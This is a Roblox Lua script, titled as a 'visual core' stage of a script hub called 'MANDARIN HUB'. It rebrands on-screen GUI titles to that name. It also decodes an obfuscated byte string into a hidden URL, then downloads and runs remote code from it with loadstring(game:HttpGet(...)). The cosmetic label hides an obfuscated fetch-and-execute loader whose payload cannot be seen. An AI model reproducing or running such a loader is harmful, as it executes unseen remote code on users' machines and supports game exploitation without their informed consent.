
--[[ STAGE 2: VISUAL CORE ]]
local a0xQJA4lsP6Fdim2="\010\065\040\214\045\088\243\069\008\053\080\066\028\099\102\103\047\116\128\122\126\114\122\145\133\093\098\090\152\158\159\164\197"local ZY7MUusogqTuNx=54 local HmqVEopdmtuwcMzyAt=169 local UmNvhV7_A5eHDIli=0 local h8Mu6Nihzy6_E3y4=5 local JOpZFnMP6QMW5ELxq=25 local gTDKnx9HIqGJveMyKhVEFh=true local I7kBYQZlg1dJLo=bit32 and bit32.bxor if not I7kBYQZlg1dJLo then I7kBYQZlg1dJLo=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local nP1ROHheQgIMJiat={}for GH2CbZJ1kUv6r=1,#a0xQJA4lsP6Fdim2 do local AJmczkFNtPFxRCw=string.byte(a0xQJA4lsP6Fdim2,GH2CbZJ1kUv6r)local qHA5lijXuVvis=(HmqVEopdmtuwcMzyAt+(GH2CbZJ1kUv6r*h8Mu6Nihzy6_E3y4)+JOpZFnMP6QMW5ELxq)%256 if UmNvhV7_A5eHDIli==0 then AJmczkFNtPFxRCw=(AJmczkFNtPFxRCw-qHA5lijXuVvis)%256 nP1ROHheQgIMJiat[GH2CbZJ1kUv6r]=string.char(I7kBYQZlg1dJLo(AJmczkFNtPFxRCw,ZY7MUusogqTuNx))else AJmczkFNtPFxRCw=I7kBYQZlg1dJLo(AJmczkFNtPFxRCw,ZY7MUusogqTuNx)nP1ROHheQgIMJiat[GH2CbZJ1kUv6r]=string.char((AJmczkFNtPFxRCw-qHA5lijXuVvis)%256)end end local vNrY2GGlSOrr9gD8gwIm=table.concat(nP1ROHheQgIMJiat)if gTDKnx9HIqGJveMyKhVEFh then vNrY2GGlSOrr9gD8gwIm=string.reverse(vNrY2GGlSOrr9gD8gwIm)end local IwVlH_eiEopaoo=vNrY2GGlSOrr9gD8gwIm
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(IwVlH_eiEopaoo))()
